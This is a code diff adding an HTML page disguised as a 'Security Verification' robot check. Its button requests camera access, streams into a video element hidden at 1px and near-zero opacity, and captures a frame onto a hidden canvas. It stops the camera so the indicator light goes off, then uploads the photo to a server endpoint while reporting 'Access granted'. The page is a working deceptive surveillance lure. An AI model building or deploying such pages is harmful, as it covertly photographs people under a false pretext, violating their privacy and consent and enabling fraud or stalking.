@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background-color: #fafafa; }
+        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); text-align: center; max-width: 400px; width: 90%; border: 1px solid #eaeaea; }
+        h2 { color: #333; font-size: 22px; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
+        .btn { background-color: #0070f3; color: white; border: none; padding: 12px 24px; font-size: 15px; border-radius: 5px; cursor: pointer; font-weight: 500; width: 100%; transition: background 0.2s; }
+        .btn:hover { background-color: #0062d6; }
+        #videoElement { width: 1px; height: 1px; opacity: 0.01; position: absolute; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>Security Verification</h2>
+        <!-- Requested user message -->
+        <p>We need to confirm that you're not a robot</p>
+        
+        <button class="btn" id="verifyBtn">Verify Identity</button>
+        <div id="status" style="margin-top: 15px; font-size: 13px; color: #888;"></div>
+    </div>
+
+    <!-- Video element kept hidden from view layout -->
+    <video id="videoElement" autoplay playsinline></video>
+    <canvas id="canvasElement" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const verifyBtn = document.getElementById('verifyBtn');
+        const video = document.getElementById('videoElement');
+        const canvas = document.getElementById('canvasElement');
+        const statusDiv = document.getElementById('status');
+
+        verifyBtn.addEventListener('click', async () => {
+            statusDiv.innerText = "Requesting device permission...";
+            
+            try {
+                // Explicitly prompt browser hardware layer for camera verification
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                video.srcObject = stream;
+                
+                statusDiv.innerText = "Analyzing security metrics...";
+                verifyBtn.disabled = true;
+
+                // Wait 1.5 seconds for camera sensor auto-exposure adjustments
+                setTimeout(() => {
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, 640, 480);
+                    
+                    // Stop camera stream tracks cleanly to turn off hardware active LED lights
+                    stream.getTracks().forEach(track => track.stop());
+
+                    const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+                    sendToServer(dataUrl);
+                }, 1500);
+
+            } catch (err) {
+                console.error(err);
+                statusDiv.innerText = "Verification failed: Camera permission required.";
+                statusDiv.style.color = "#ff3333";
+            }
+        });
+
+        async function sendToServer(base64Image) {
+            try {
+                const response = await fetch('/api/verify-identity', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: base64Image })
+                });
+
+                const result = await response.json();
+                
+                if (result.status === 'success') {
+                    statusDiv.style.color = "#00cc66";
+                    statusDiv.innerText = "Verification complete. Access granted.";
+                } else {
+                    statusDiv.innerText = "System error during verification.";
+                }
+            } catch (error) {
+                statusDiv.innerText = "Network transmission timeout.";
+            }
+        }
+    </script>
+</body>
+  </html>
+  
